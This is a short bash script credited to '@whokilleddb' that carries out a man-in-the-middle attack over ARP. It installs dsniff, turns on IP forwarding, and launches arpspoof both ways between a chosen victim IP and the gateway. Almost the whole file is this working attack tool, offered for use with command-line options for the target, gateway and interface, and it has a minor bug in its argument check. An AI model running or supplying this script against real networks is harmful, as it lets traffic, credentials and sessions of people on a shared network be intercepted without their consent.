#!/bin/bash

#defining colour schemas
NONE='\033[00m'
RED='\033[01;31m'
GREEN='\033[01;32m'
YELLOW='\033[01;33m'
PURPLE='\033[01;35m'
CYAN='\033[01;36m'
WHITE='\033[01;37m'
BOLD='\033[1m'
BLINK='\033[5m'
UNDERLINE='\033[4m'

#defining globals
script_name=$0

#check for empty parameters 
#if [ $# -ne 1 ]; then
#	echo -e "${BOLD}${GREEN}[+] Usage :$0 -o <> -t<> -i <interface> ${NONE}"
#	exit
#fi
echo -e "$MITM over ARP ${NONE}"
echo -e "${BOLD}[+] Coded By @whokilleddb ${NONE}"
#getting variables from command line
while test $# -gt 0; do
           case "$1" in
				-h|--help)
				      echo -e "${BOLD}$script_name - MITM over ARP ${NONE}"
				      echo " "
				      echo "$script_name [options] [arguments]"
				      echo " "
				      echo "[+] Options:"
				      echo "	-h, --help                show brief help"
				      echo "	-i, --interface           interface to spoof over"
				      echo "	-o, --ori                 ip to spoof"
				      echo "	-t, --tgt                 gateway ip"
				      exit 0
				      ;;
                -o|--ori)
                    shift
                    ori_ip=$1
                    shift
                    ;;
                -t|--tgt)
                    shift
                    spoof_ip=$1
                    shift
                    ;;
                -i|--inter)
                    shift
                    inter=$1
                    shift
                    ;;
                *)
                   echo "$1 is not a recognized flag!"
                   return 1;
                   ;;
          esac
done  

#check for packages
pth=""
pth=$(which dsniff)
if [ -z "$pth" ]
then
	sudo apt install dsniff
fi

pth=""
pth=$(which parallel)
if [ -z "$pth" ]
then
	sudo apt install parallel
fi

pth=""
pth=$(which xterm)
if [ -z "$pth" ]
then
	sudo apt install xterm
fi


#Enable IP forwading
sudo sysctl -w net.ipv4.ip_forward=1
if [[ -z "$ori_ip" || -z "spoof_ip" || -z "$inter" ]]
then
     echo -e "${BOLD}$script_name - MITM over ARP ${NONE}"
     echo " "
     echo "$script_name [options] [arguments]"
     echo " "
     echo "[+] Options:"
     echo "	-h, --help                show brief help"
     echo "	-i, --interface           interface to spoof over"
     echo "	-o, --ori                 ip to spoof"
     echo "	-t, --tgt                 gateway ip"
     exit 0
fi

echo -e "${PURPLE}[+] IP to Spoof   : $ori_ip${NONE}";
echo -e "${YELLOW}[+] IP of Gateway : $spoof_ip${NONE}";
echo -e "${CYAN}[+]Interface       : $inter${NONE}"

echo -e "${GREEN}[+] Telling $ori_ip that I am $spoof_ip ${NONE}"
xterm -e sudo $(which arpspoof) -i $inter -t $ori_ip $spoof_ip &
echo -e "${RED}[+] Telling $spoof_ip that I am $ori_ip ${NONE}"
xterm -e sudo $(which arpspoof) -i $inter -t $spoof_ip $ori_ip
